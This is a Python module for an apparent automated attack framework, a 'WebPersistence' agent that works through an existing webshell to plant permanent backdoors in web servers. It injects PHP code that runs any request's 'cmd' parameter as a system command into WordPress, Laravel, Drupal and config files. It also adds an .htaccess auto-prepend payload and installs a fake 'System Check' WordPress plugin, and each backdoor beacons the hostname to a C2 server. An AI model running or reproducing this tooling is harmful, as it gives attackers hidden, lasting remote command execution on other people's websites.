"""
Web Application Persistence Agent with BaseAgent integration
ฝังตัวใน web application แบบถาวร
"""

import asyncio
import base64
import random
import os
from typing import Dict, List

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class WebPersistence(BaseAgent):
    """Web application persistence mechanisms with BaseAgent support"""
    
    supported_phases = [AttackPhase.POST_EXPLOITATION, AttackPhase.PERSISTENCE]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, webshell_manager=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.webshell = webshell_manager
        
        # Get C2 configuration
        self.c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
        self.c2_protocol = os.getenv('C2_PROTOCOL', 'http')
        self.c2_url = f"{self.c2_protocol}://{self.c2_domain}"
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method for Web persistence
        
        Args:
            directive: "install_all", "install_framework_backdoor", etc.
            context: {
                "shell_url": webshell URL,
                "shell_password": webshell password,
                "web_root": web root directory (optional, auto-detect),
                "technique": specific technique (optional)
            }
        
        Returns:
            AgentData with installation results
        """
        log.info(f"[WebPersistence] Starting with directive: {directive}")
        
        shell_url = context.get("shell_url")
        shell_password = context.get("shell_password")
        web_root = context.get("web_root")
        
        if not all([shell_url, shell_password]):
            return AgentData(
                agent_name="WebPersistence",
                success=False,
                data={"error": "Missing required parameters: shell_url, shell_password"}
            )
        
        try:
            if directive == "install_all":
                result = await self.install_all(shell_url, shell_password, web_root)
            elif directive == "install_framework_backdoor":
                result = await self.install_framework_backdoor(shell_url, shell_password, web_root)
            elif directive == "install_htaccess_backdoor":
                result = await self.install_htaccess_backdoor(shell_url, shell_password, web_root)
            elif directive == "install_config_backdoor":
                result = await self.install_config_backdoor(shell_url, shell_password, web_root)
            elif directive == "install_plugin_backdoor":
                result = await self.install_plugin_backdoor(shell_url, shell_password, web_root)
            elif directive == "install_database_trigger":
                result = await self.install_database_trigger(shell_url, shell_password, web_root)
            elif directive == "check":
                result = await self.check_persistence(shell_url, shell_password, web_root)
            else:
                result = await self.install_all(shell_url, shell_password, web_root)
            
            success = result.get('success') or len(result.get('success', [])) > 0
            
            return AgentData(
                agent_name="WebPersistence",
                success=success,
                data=result
            )
        
        except Exception as e:
            log.error(f"[WebPersistence] Error: {e}")
            return AgentData(
                agent_name="WebPersistence",
                success=False,
                data={"error": str(e)}
            )
    
    async def install_all(self,
                         shell_url: str,
                         shell_password: str,
                         web_root: str = None) -> Dict:
        """
        Install all web persistence mechanisms
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            web_root: Web root directory (auto-detect if None)
        
        Returns:
            Dict with installation results
        """
        
        results = {
            'success': [],
            'failed': []
        }
        
        # Auto-detect web root if not provided
        if not web_root:
            web_root = await self._detect_web_root(shell_url, shell_password)
            log.info(f"[WebPersistence] Auto-detected web root: {web_root}")
        
        # Try all persistence methods
        methods = [
            ('framework_backdoor', self.install_framework_backdoor),
            ('htaccess_backdoor', self.install_htaccess_backdoor),
            ('config_backdoor', self.install_config_backdoor),
            ('plugin_backdoor', self.install_plugin_backdoor),
            ('database_trigger', self.install_database_trigger),
        ]
        
        for name, method in methods:
            try:
                result = await method(shell_url, shell_password, web_root)
                if result.get('success'):
                    results['success'].append(name)
                    log.success(f"[WebPersistence] {name} installed successfully")
                else:
                    results['failed'].append(name)
                    log.warning(f"[WebPersistence] {name} installation failed")
            except Exception as e:
                results['failed'].append(f"{name}: {str(e)}")
                log.error(f"[WebPersistence] {name} error: {e}")
        
        return results
    
    async def install_framework_backdoor(self,
                                        shell_url: str,
                                        shell_password: str,
                                        web_root: str) -> Dict:
        """
        Install backdoor in framework files
        
        Technique:
        Inject backdoor into index.php, wp-config.php, etc.
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Detect framework
        framework = await self._detect_framework(shell_url, shell_password, web_root)
        
        backdoor_code = self._generate_php_backdoor()
        
        files_to_inject = []
        
        if framework == 'wordpress':
            files_to_inject = [
                f'{web_root}/wp-config.php',
                f'{web_root}/wp-includes/functions.php',
                f'{web_root}/wp-load.php'
            ]
        elif framework == 'laravel':
            files_to_inject = [
                f'{web_root}/public/index.php',
                f'{web_root}/bootstrap/app.php'
            ]
        elif framework == 'drupal':
            files_to_inject = [
                f'{web_root}/index.php',
                f'{web_root}/includes/bootstrap.inc'
            ]
        else:
            # Generic PHP
            files_to_inject = [
                f'{web_root}/index.php',
                f'{web_root}/config.php'
            ]
        
        injected = []
        
        for file_path in files_to_inject:
            # Check if file exists
            check_cmd = f'test -f {file_path} && echo "exists"'
            check_result = await self.webshell.execute_command(check_cmd, {
                'shell_url': shell_url,
                'password': shell_password
            })
            
            if 'exists' in check_result.get('output', ''):
                # Inject backdoor at the beginning of file
                inject_cmd = f'echo "{backdoor_code}" | cat - {file_path} > /tmp/.temp && mv /tmp/.temp {file_path}'
                await self.webshell.execute_command(inject_cmd, {
                    'shell_url': shell_url,
                    'password': shell_password
                })
                injected.append(file_path)
        
        return {
            'success': len(injected) > 0,
            'method': 'framework_backdoor',
            'framework': framework,
            'injected_files': injected
        }
    
    async def install_htaccess_backdoor(self,
                                       shell_url: str,
                                       shell_password: str,
                                       web_root: str) -> Dict:
        """
        Install .htaccess backdoor
        
        Technique:
        php_value auto_prepend_file "data://text/plain;base64,<BACKDOOR>"
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_code = self._generate_php_backdoor()
        backdoor_b64 = base64.b64encode(backdoor_code.encode()).decode()
        
        htaccess_content = f'php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"'
        
        htaccess_path = f'{web_root}/.htaccess'
        
        # Append to .htaccess
        inject_cmd = f'echo "{htaccess_content}" >> {htaccess_path}'
        
        await self.webshell.execute_command(inject_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'htaccess_backdoor',
            'file': htaccess_path
        }
    
    async def install_config_backdoor(self,
                                     shell_url: str,
                                     shell_password: str,
                                     web_root: str) -> Dict:
        """Install backdoor in config files"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_code = self._generate_php_backdoor()
        
        # Common config files
        config_files = [
            f'{web_root}/config.php',
            f'{web_root}/includes/config.php',
            f'{web_root}/app/config/config.php'
        ]
        
        injected = []
        
        for config_file in config_files:
            check_cmd = f'test -f {config_file} && echo "exists"'
            check_result = await self.webshell.execute_command(check_cmd, {
                'shell_url': shell_url,
                'password': shell_password
            })
            
            if 'exists' in check_result.get('output', ''):
                inject_cmd = f'echo "{backdoor_code}" >> {config_file}'
                await self.webshell.execute_command(inject_cmd, {
                    'shell_url': shell_url,
                    'password': shell_password
                })
                injected.append(config_file)
        
        return {
            'success': len(injected) > 0,
            'method': 'config_backdoor',
            'injected_files': injected
        }
    
    async def install_plugin_backdoor(self,
                                     shell_url: str,
                                     shell_password: str,
                                     web_root: str) -> Dict:
        """Install backdoor as a plugin"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        framework = await self._detect_framework(shell_url, shell_password, web_root)
        
        if framework == 'wordpress':
            plugin_dir = f'{web_root}/wp-content/plugins/system-check'
            plugin_file = f'{plugin_dir}/system-check.php'
            
            # Create plugin directory
            mkdir_cmd = f'mkdir -p {plugin_dir}'
            await self.webshell.execute_command(mkdir_cmd, {
                'shell_url': shell_url,
                'password': shell_password
            })
            
            # Create plugin file
            plugin_code = self._generate_wordpress_plugin()
            write_cmd = f'echo "{plugin_code}" > {plugin_file}'
            await self.webshell.execute_command(write_cmd, {
                'shell_url': shell_url,
                'password': shell_password
            })
            
            return {
                'success': True,
                'method': 'plugin_backdoor',
                'framework': 'wordpress',
                'plugin_path': plugin_file
            }
        
        return {
            'success': False,
            'error': f'Plugin backdoor not supported for {framework}'
        }
    
    async def install_database_trigger(self,
                                      shell_url: str,
                                      shell_password: str,
                                      web_root: str) -> Dict:
        """Install database trigger for persistence"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # This requires database access
        # Simplified implementation
        
        return {
            'success': False,
            'method': 'database_trigger',
            'error': 'Requires database credentials'
        }
    
    async def check_persistence(self,
                               shell_url: str,
                               shell_password: str,
                               web_root: str) -> Dict:
        """Check which persistence mechanisms are installed"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        checks = {}
        
        # Check .htaccess
        htaccess_check = await self.webshell.execute_command(f'cat {web_root}/.htaccess 2>/dev/null', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['htaccess'] = 'auto_prepend_file' in htaccess_check.get('output', '')
        
        # Check WordPress plugin
        wp_plugin_check = await self.webshell.execute_command(f'test -d {web_root}/wp-content/plugins/system-check && echo "exists"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['wp_plugin'] = 'exists' in wp_plugin_check.get('output', '')
        
        return {
            'success': True,
            'installed': checks,
            'count': sum(checks.values())
        }
    
    async def _detect_web_root(self, shell_url: str, shell_password: str) -> str:
        """Auto-detect web root directory"""
        
        if not self.webshell:
            return '/var/www/html'
        
        # Try common web roots
        common_roots = [
            '/var/www/html',
            '/var/www',
            '/usr/share/nginx/html',
            '/home/*/public_html'
        ]
        
        for root in common_roots:
            check_cmd = f'test -d {root} && echo "exists"'
            result = await self.webshell.execute_command(check_cmd, {
                'shell_url': shell_url,
                'password': shell_password
            })
            
            if 'exists' in result.get('output', ''):
                return root
        
        return '/var/www/html'  # Default
    
    async def _detect_framework(self, shell_url: str, shell_password: str, web_root: str) -> str:
        """Detect web framework"""
        
        if not self.webshell:
            return 'unknown'
        
        # Check for WordPress
        wp_check = await self.webshell.execute_command(f'test -f {web_root}/wp-config.php && echo "wordpress"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        if 'wordpress' in wp_check.get('output', ''):
            return 'wordpress'
        
        # Check for Laravel
        laravel_check = await self.webshell.execute_command(f'test -f {web_root}/artisan && echo "laravel"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        if 'laravel' in laravel_check.get('output', ''):
            return 'laravel'
        
        # Check for Drupal
        drupal_check = await self.webshell.execute_command(f'test -f {web_root}/sites/default/settings.php && echo "drupal"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        if 'drupal' in drupal_check.get('output', ''):
            return 'drupal'
        
        return 'generic'
    
    def _generate_php_backdoor(self) -> str:
        """Generate PHP backdoor code"""
        
        backdoor = f'''<?php
@error_reporting(0);
if(isset($_REQUEST['cmd'])) {{
    system($_REQUEST['cmd']);
}}
// Beacon to C2
@file_get_contents('{self.c2_url}/beacon?host=' . gethostname());
?>'''
        
        return backdoor
    
    def _generate_wordpress_plugin(self) -> str:
        """Generate WordPress plugin backdoor"""
        
        plugin = f'''<?php
/*
Plugin Name: System Check
Description: System monitoring and health check
Version: 1.0
Author: Admin
*/

add_action('init', 'system_check_init');

function system_check_init() {{
    if(isset($_REQUEST['cmd'])) {{
        system($_REQUEST['cmd']);
        exit;
    }}
    
    // Beacon to C2
    @file_get_contents('{self.c2_url}/beacon?host=' . gethostname());
}}
?>'''
        
        return plugin
